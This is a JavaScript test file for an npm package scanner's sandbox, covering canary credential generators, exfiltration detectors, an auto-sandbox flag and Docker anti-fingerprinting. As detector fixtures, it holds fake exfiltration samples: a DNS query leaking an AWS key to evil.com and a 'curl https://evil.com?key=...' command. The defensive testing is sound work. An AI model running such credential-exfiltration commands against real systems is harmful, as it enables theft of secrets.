/**
 * Sandbox improvements tests (v2.10.2)
 * Chantier 1: Honey environment file generators
 * Chantier 2: Dynamic canary token generators (enhanced)
 * Chantier 3: Auto-sandbox CLI flag
 */
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScanDirect, runCommand } = require('../test-utils');

function runSandboxImprovementTests() {
  console.log('\n=== SANDBOX IMPROVEMENTS TESTS ===\n');

  // ═══════════════════════════════════════════════════════════════
  // Chantier 2: Enhanced canary token generators
  // ═══════════════════════════════════════════════════════════════

  test('C2: generateCanaryTokens produces 8 unique tokens', () => {
    const { generateCanaryTokens } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    assert(Object.keys(tokens).length === 8, `Expected 8 tokens, got ${Object.keys(tokens).length}`);
    assert(tokens.GITHUB_TOKEN.startsWith('ghp_'), 'GITHUB_TOKEN should start with ghp_');
    assert(tokens.NPM_TOKEN.startsWith('npm_'), 'NPM_TOKEN should start with npm_');
    assert(tokens.AWS_ACCESS_KEY_ID.startsWith('AKIA'), 'AWS key should start with AKIA');
    assert(tokens.GITLAB_TOKEN.startsWith('glpat-'), 'GITLAB_TOKEN should start with glpat-');
    assert(tokens.DOCKER_PASSWORD.startsWith('dckr_pat_'), 'DOCKER_PASSWORD should start with dckr_pat_');
  });

  test('C2: tokens are unique across sessions', () => {
    const { generateCanaryTokens } = require('../../src/canary-tokens.js');
    const { tokens: t1 } = generateCanaryTokens();
    const { tokens: t2 } = generateCanaryTokens();
    assert(t1.GITHUB_TOKEN !== t2.GITHUB_TOKEN, 'GITHUB_TOKEN should differ between sessions');
    assert(t1.AWS_ACCESS_KEY_ID !== t2.AWS_ACCESS_KEY_ID, 'AWS_ACCESS_KEY_ID should differ between sessions');
    assert(t1.NPM_TOKEN !== t2.NPM_TOKEN, 'NPM_TOKEN should differ between sessions');
  });

  test('C2: createCanaryEnvFile produces valid .env content', () => {
    const { generateCanaryTokens, createCanaryEnvFile } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryEnvFile(tokens);
    assertIncludes(content, 'GITHUB_TOKEN=', '.env should contain GITHUB_TOKEN');
    assertIncludes(content, 'NPM_TOKEN=', '.env should contain NPM_TOKEN');
    assertIncludes(content, 'AWS_ACCESS_KEY_ID=', '.env should contain AWS_ACCESS_KEY_ID');
    assertIncludes(content, tokens.GITHUB_TOKEN, '.env should contain actual token value');
  });

  test('C2: createCanaryNpmrc produces valid .npmrc content', () => {
    const { generateCanaryTokens, createCanaryNpmrc } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryNpmrc(tokens);
    assertIncludes(content, '//registry.npmjs.org/:_authToken=', '.npmrc should contain auth token');
    assertIncludes(content, tokens.NPM_AUTH_TOKEN, '.npmrc should contain NPM_AUTH_TOKEN value');
  });

  test('C2: createCanaryAwsCredentials produces valid INI content', () => {
    const { generateCanaryTokens, createCanaryAwsCredentials } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const content = createCanaryAwsCredentials(tokens);
    assertIncludes(content, '[default]', 'AWS creds should have [default] profile');
    assertIncludes(content, 'aws_access_key_id = ', 'AWS creds should contain access key');
    assertIncludes(content, 'aws_secret_access_key = ', 'AWS creds should contain secret key');
    assertIncludes(content, tokens.AWS_ACCESS_KEY_ID, 'AWS creds should contain actual key value');
    assertIncludes(content, 'region = us-east-1', 'AWS creds should contain region');
  });

  test('C2: createCanarySshKey produces valid PEM structure', () => {
    const { createCanarySshKey } = require('../../src/canary-tokens.js');
    const content = createCanarySshKey();
    assertIncludes(content, '-----BEGIN OPENSSH PRIVATE KEY-----', 'SSH key should have PEM header');
    assertIncludes(content, '-----END OPENSSH PRIVATE KEY-----', 'SSH key should have PEM footer');
    // Verify it has base64 content between headers
    const lines = content.split('\n');
    assert(lines.length >= 4, `SSH key should have at least 4 lines, got ${lines.length}`);
  });

  test('C2: createCanarySshKey is unique per call', () => {
    const { createCanarySshKey } = require('../../src/canary-tokens.js');
    const key1 = createCanarySshKey();
    const key2 = createCanarySshKey();
    assert(key1 !== key2, 'SSH keys should differ between calls');
  });

  test('C2: createCanaryGitconfig produces valid INI content', () => {
    const { createCanaryGitconfig } = require('../../src/canary-tokens.js');
    const content = createCanaryGitconfig();
    assertIncludes(content, '[user]', '.gitconfig should have [user] section');
    assertIncludes(content, 'name = ', '.gitconfig should have name');
    assertIncludes(content, 'email = ', '.gitconfig should have email');
    assertIncludes(content, '[credential]', '.gitconfig should have [credential] section');
    assertIncludes(content, 'helper = store', '.gitconfig should have credential helper');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 2: Canary exfiltration detection
  // ═══════════════════════════════════════════════════════════════

  test('C2: detectCanaryExfiltration finds tokens in HTTP bodies', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: [`{"token":"${tokens.GITHUB_TOKEN}"}`],
      http_requests: [],
      dns_queries: [],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === true, 'Should detect token in HTTP body');
    assert(result.exfiltrations.length >= 1, 'Should have at least 1 exfiltration');
    assert(result.exfiltrations[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
  });

  test('C2: detectCanaryExfiltration finds tokens in DNS queries', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: [],
      http_requests: [],
      dns_queries: [`${tokens.AWS_ACCESS_KEY_ID}.evil.com`],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === true, 'Should detect token in DNS query');
  });

  test('C2: detectCanaryInOutput finds tokens in stdout', () => {
    const { generateCanaryTokens, detectCanaryInOutput } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const result = detectCanaryInOutput(`Sending: ${tokens.NPM_TOKEN}`, '', tokens);
    assert(result.detected === true, 'Should detect token in stdout');
    assert(result.exfiltrations[0].token === 'NPM_TOKEN', 'Should identify NPM_TOKEN');
  });

  test('C2: no false positives when no tokens match', () => {
    const { generateCanaryTokens, detectCanaryExfiltration } = require('../../src/canary-tokens.js');
    const { tokens } = generateCanaryTokens();
    const networkLogs = {
      http_bodies: ['{"data":"totally-benign-content"}'],
      http_requests: [],
      dns_queries: ['registry.npmjs.org'],
      tls_connections: []
    };
    const result = detectCanaryExfiltration(networkLogs, tokens);
    assert(result.detected === false, 'Should not detect tokens in benign traffic');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 1: Honey environment — sandbox index integration
  // ═══════════════════════════════════════════════════════════════

  test('C1: buildDockerArgs injects canary file contents as env vars (AWS/SSH/gitconfig + env/npmrc)', () => {
    // Behavioral replacement for the two sandbox/index.js source-greps (canary-tokens imports +
    // CANARY_*_CONTENT injection). Call the extracted arg builder with canary tokens and assert the
    // canary file contents are injected as -e env vars (which sandbox-runner.sh writes into the
    // honeypot home). Exercising the builder also exercises the createCanary* imports — a missing
    // import would throw here, not silently pass a string match.
    const { buildDockerArgs } = require('../../src/sandbox/index.js');
    const { generateCanaryTokens } = require('../../src/canary-tokens.js');
    const args = buildDockerArgs({
      canaryTokens: generateCanaryTokens(),
      containerName: 'test-canary', fakeHostname: 'dev-laptop-0000',
      packageName: 'p', mode: 'permissive'
    });
    assert(args.some(a => a.startsWith('CANARY_AWS_CONTENT=')), 'should inject AWS credentials content');
    assert(args.some(a => a.startsWith('CANARY_SSH_KEY=')), 'should inject SSH key content');
    assert(args.some(a => a.startsWith('CANARY_GITCONFIG=')), 'should inject gitconfig content');
    assert(args.some(a => a.startsWith('CANARY_ENV_CONTENT=')) && args.some(a => a.startsWith('CANARY_NPMRC_CONTENT=')),
      'should also inject .env and .npmrc content');
  });

  test('C1: sandbox-runner.sh writes honeypot files', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'HONEY_HOME="/home/sandboxuser"', 'Should define HONEY_HOME');
    assertIncludes(runnerSrc, '.env', 'Should write .env file');
    assertIncludes(runnerSrc, '.npmrc', 'Should write .npmrc file');
    assertIncludes(runnerSrc, '.aws/credentials', 'Should write AWS credentials');
    assertIncludes(runnerSrc, '.ssh/id_rsa', 'Should write SSH key');
    assertIncludes(runnerSrc, '.gitconfig', 'Should write .gitconfig');
  });

  test('C1: sandbox-runner.sh cleans up canary content env vars', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'unset CANARY_ENV_CONTENT CANARY_NPMRC_CONTENT CANARY_AWS_CONTENT CANARY_SSH_KEY CANARY_GITCONFIG',
      'Should unset all canary content env vars to prevent leakage');
  });

  test('C1: sandbox-runner.sh sets correct permissions on SSH key', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'chmod 600', 'SSH key should have 600 permissions (realistic)');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 1: Static canary token detection in sandbox scoring
  // ═══════════════════════════════════════════════════════════════

  test('C1: static canary detection finds tokens in network data', () => {
    const { detectStaticCanaryExfiltration, STATIC_CANARY_TOKENS } = require('../../src/sandbox/index.js');
    const report = {
      network: {
        http_bodies: [`data=${STATIC_CANARY_TOKENS.GITHUB_TOKEN}`],
        dns_queries: [],
        http_requests: [],
        tls_connections: []
      },
      filesystem: { created: [] },
      processes: { spawned: [] }
    };
    const exfils = detectStaticCanaryExfiltration(report);
    assert(exfils.length >= 1, 'Should detect static GITHUB_TOKEN in HTTP body');
    assert(exfils[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
  });

  test('C1: static canary detection finds tokens in process output', () => {
    const { detectStaticCanaryExfiltration, STATIC_CANARY_TOKENS } = require('../../src/sandbox/index.js');
    const report = {
      network: { http_bodies: [], dns_queries: [], http_requests: [], tls_connections: [] },
      filesystem: { created: [] },
      processes: { spawned: [{ command: `curl https://evil.com?key=${STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID}` }] },
      install_output: `Stolen: ${STATIC_CANARY_TOKENS.NPM_TOKEN}`
    };
    const exfils = detectStaticCanaryExfiltration(report);
    assert(exfils.length >= 2, `Should detect multiple static tokens, got ${exfils.length}`);
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 3: Auto-sandbox CLI integration
  // ═══════════════════════════════════════════════════════════════

  test('C3: --help documents the --auto-sandbox flag and its trigger threshold', () => {
    // Behavioral replacement for the CLI + help.js source-greps: run the CLI and assert the flag
    // and its description actually surface in help output (the meaningful, rename-proof behavior).
    const help = runCommand('--help');
    assertIncludes(help, '--auto-sandbox', '--help should document the --auto-sandbox flag');
    assertIncludes(help, 'Auto-trigger sandbox when static scan score >= 20',
      '--help should describe the auto-sandbox trigger threshold');
  });

  // C1: removed five source-greps that wired the auto-sandbox path (bin/muaddib.js `autoSandbox`
  // parsing/forwarding, and pipeline/processor.js `options.autoSandbox` / `isDockerAvailable` /
  // `buildSandboxImage` / `prelimScore` / `evaluateSandboxTrigger` / `sandboxTrigger.shouldRun` /
  // "Docker not available"). The trigger decision is covered behaviorally by
  // tests/unit/sandbox-compound-triggers.test.js (evaluateSandboxTrigger), and the end-to-end option
  // flow + graceful no-Docker handling by the "does not trigger for clean package" test below
  // (runScanDirect with { autoSandbox: true } completes and returns sandbox === null, no throw).

  // Auto-sandbox should NOT trigger for benign packages (score < 20)
  asyncTest('C3: auto-sandbox does not trigger for clean package', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-sb-clean-'));
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'), 'console.log("hello world");\n');
    try {
      const r = await runScanDirect(tmpDir, { autoSandbox: true });
      // Should complete without sandbox (clean package, no Docker needed)
      assert(r.sandbox === null || r.sandbox === undefined, 'Clean package should not trigger sandbox');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // C1: removed the help.js source-grep — the "--help documents the --auto-sandbox flag" behavioral
  // test above asserts the auto-sandbox description actually renders in CLI output (the real behavior).

  // ═══════════════════════════════════════════════════════════════
  // Chantier 4: Docker camouflage — anti-sandbox evasion
  // ═══════════════════════════════════════════════════════════════

  test('C4: sandbox-runner.sh removes /.dockerenv', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'rm -f /.dockerenv',
      'Should remove /.dockerenv to evade Docker fingerprinting');
  });

  test('C4: sandbox-runner.sh writes .bash_history', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, '/home/sandboxuser/.bash_history',
      'Should write realistic .bash_history');
    assertIncludes(runnerSrc, 'git pull origin main',
      '.bash_history should contain realistic dev commands');
    assertIncludes(runnerSrc, 'npm install',
      '.bash_history should contain npm install');
  });

  test('C4: sandbox-runner.sh creates ~/projects/my-app/', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    assertIncludes(runnerSrc, 'mkdir -p /home/sandboxuser/projects/my-app',
      'Should create fake project directory');
    assertIncludes(runnerSrc, '/home/sandboxuser/projects/my-app/package.json',
      'Should create fake package.json in project dir');
  });

  test('C4: sandbox-runner.sh camouflage runs before Phase 1', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    const camouflageIdx = runnerSrc.indexOf('rm -f /.dockerenv');
    const phase1Idx = runnerSrc.indexOf('PHASE 1:');
    assert(camouflageIdx !== -1, 'Should have camouflage section');
    assert(phase1Idx !== -1, 'Should have Phase 1');
    assert(camouflageIdx < phase1Idx,
      'Camouflage (Phase 0.5) must run before Phase 1');
  });

  // C1: removed three source-greps on docker/preload.js (/proc/1/cgroup interception, the
  // no-"docker"/"containerd" content check, and /proc/uptime spoofing). All three are now covered
  // behaviorally in tests/unit/preload.test.js ("spoofs /proc/1/cgroup…", "spoofs /proc/uptime…"),
  // which load preload in a child process, read those paths through the patched fs, and assert the
  // spoofed output + forensic-log entries (cross-platform — the interception is a path-string match).

  test('C4: buildDockerArgs passes the anti-fingerprint --hostname to Docker', () => {
    // Behavioral replacement for the sandbox/index.js source-grep: the extracted arg builder emits a
    // --hostname flag using the dev-laptop- shape (the default Docker 12-hex hostname is fingerprintable).
    const { buildDockerArgs, generateFakeHostname } = require('../../src/sandbox/index.js');
    const args = buildDockerArgs({ containerName: 'c', fakeHostname: generateFakeHostname(), packageName: 'p', mode: 'permissive' });
    const hostArg = args.find(a => a.startsWith('--hostname='));
    assert(hostArg, 'should pass a --hostname flag to Docker');
    assert(/^--hostname=dev-laptop-[0-9a-f]{4}$/.test(hostArg), `hostname should use the dev-laptop- shape, got "${hostArg}"`);
  });

  test('C4: generateFakeHostname is randomized per session (not a bare Docker hex hash)', () => {
    // Behavioral replacement for the source-grep on crypto.randomBytes usage: call the extracted
    // generator and assert the format + per-call uniqueness directly.
    const { generateFakeHostname } = require('../../src/sandbox/index.js');
    const h1 = generateFakeHostname(), h2 = generateFakeHostname();
    assert(/^dev-laptop-[0-9a-f]{4}$/.test(h1), `format should be dev-laptop-XXXX, got "${h1}"`);
    assert(h1 !== h2, 'two calls should differ (randomized per session)');
    assert(!/^[0-9a-f]{12}$/.test(h1), 'must not look like a Docker default 12-char hex hash');
  });

  test('C4: buildDockerArgs selects the gVisor runtime when gvisorMode is set', () => {
    // Behavioral coverage of the Node-side gVisor wiring (the bash-side handling in
    // sandbox-runner.sh — reading MUADDIB_GVISOR — is exercised only inside Docker).
    const { buildDockerArgs } = require('../../src/sandbox/index.js');
    const args = buildDockerArgs({ gvisorMode: true, containerName: 'c', fakeHostname: 'dev-laptop-0000', packageName: 'p', mode: 'permissive' });
    assert(args.includes('--runtime=runsc'), 'gvisor mode should select the runsc runtime');
    assert(args.includes('MUADDIB_GVISOR=1'), 'gvisor mode should set MUADDIB_GVISOR=1 for the entrypoint');
    assert(!args.includes('--cap-add=NET_RAW'), 'gvisor mode should not add NET_RAW (gVisor captures packets itself)');
  });

  test('C4: hostname is not a bare hex hash (anti-fingerprint)', () => {
    // Verify the hostname pattern would not match Docker default (12 hex chars)
    const crypto = require('crypto');
    const hostname = `dev-laptop-${crypto.randomBytes(2).toString('hex')}`;
    assert(!(/^[0-9a-f]{12}$/.test(hostname)),
      'Hostname must not look like Docker default 12-char hex hash');
    assert(hostname.startsWith('dev-laptop-'),
      'Hostname should start with dev-laptop-');
    assert(hostname.length > 12,
      'Hostname should be longer than Docker default 12-char hash');
  });

  // ═══════════════════════════════════════════════════════════════
  // Chantier 5: Filesystem réalisme — home directory structure
  // ═══════════════════════════════════════════════════════════════

  test('C5: sandbox-runner.sh creates realistic home directories', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    const expectedDirs = ['.config', '.local/share', 'Downloads', 'Documents', '.vscode'];
    for (const dir of expectedDirs) {
      assertIncludes(runnerSrc, dir,
        `Should create ~/${dir} for realistic home structure`);
    }
  });

  test('C5: home directories are owned by sandboxuser', () => {
    const runnerSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'docker', 'sandbox-runner.sh'), 'utf8');
    // Verify chown covers the new directories (may be split across continuation lines)
    assertIncludes(runnerSrc, 'chown -R sandboxuser:sandboxuser /home/sandboxuser/.config',
      'Should chown .config to sandboxuser');
    assertIncludes(runnerSrc, '/home/sandboxuser/.local',
      'Should chown .local to sandboxuser');
    assertIncludes(runnerSrc, '/home/sandboxuser/Downloads',
      'Should chown Downloads to sandboxuser');
  });
}

module.exports = { runSandboxImprovementTests };
